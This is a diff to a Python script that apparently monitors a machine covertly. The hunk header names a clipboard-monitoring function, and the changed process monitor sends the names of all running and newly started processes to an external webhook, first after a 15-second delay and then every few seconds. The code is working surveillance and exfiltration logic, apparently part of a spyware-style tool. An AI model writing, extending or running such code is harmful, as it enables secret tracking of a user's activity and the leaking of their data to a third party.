@@ -144,35 +144,42 @@ def monitor_clipboard():
 
         except Exception as e:
             print(f"Error accessing clipboard: {e}")
+            
 def monitor_processes():
     running_processes = set()
     first_check = True  # Flag to handle the first delay
     last_check_time = time.time()  # Track time of the last process check
+    reset_timer = False  # Flag to determine when to reset the timer and send the message
 
     while True:
         current_processes = set(p.name() for p in psutil.process_iter())
         new_processes = current_processes - running_processes
         closed_processes = running_processes - current_processes
 
-        # If it's the first check, wait for 15 seconds
+        # If it's the first check, wait for 15 seconds and send all processes
         if first_check:
             time.sleep(15)  # Initial delay of 15 seconds
             first_check = False  # Disable the first check flag
+            message = f"Started processes: {', '.join(current_processes)}"
+            send_to_webhook(message)  # Send all processes at the start
+            running_processes = current_processes  # Update the running processes list
 
-        # If no new processes have been detected for 2 seconds, send a message
+        # If a new process is detected, reset the timer
+        if new_processes:
+            reset_timer = True
+            last_check_time = time.time()  # Reset the timer when a new process is detected
+            for proc in new_processes:
+                message = f"Started: {proc}"
+                send_to_webhook(message)
+
+        # If no new processes detected and 2 seconds passed since the last process check
         if not new_processes and (time.time() - last_check_time) >= 2:
-            message = "No new processes detected in the last 2 seconds"
-            send_to_webhook(message)
-            last_check_time = time.time()  # Reset the last check time
+            if reset_timer:
+                message = f"All processes: {', '.join(current_processes)}"
+                send_to_webhook(message)  # Send all processes at once
+                reset_timer = False  # Reset the timer flag after sending the message
 
-        for proc in new_processes:
-            message = f"Started: {proc}"
-            send_to_webhook(message)
-
-        for proc in closed_processes:
-            message = f"Closed: {proc}"
-            send_to_webhook(message)
-
+        # Update running processes and continue checking every 2 seconds
         running_processes = current_processes
         time.sleep(2)  # Check every 2 seconds after the first check
 
